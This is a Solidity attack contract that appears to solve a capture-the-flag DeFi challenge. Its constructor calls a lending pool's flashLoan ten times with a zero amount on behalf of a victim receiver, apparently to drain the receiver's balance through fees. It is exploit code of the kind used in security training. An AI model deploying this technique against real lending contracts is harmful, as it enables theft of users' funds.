pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "./NaiveReceiverLenderPool.sol";

contract NaiveAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    NaiveReceiverLenderPool public pool;

    constructor(address payable receiverAddress, address payable poolAddress) public {
        pool = NaiveReceiverLenderPool(poolAddress);
        for (uint16 i=0; i<10; i++) {
          pool.flashLoan(receiverAddress, 0);
        }
    }
}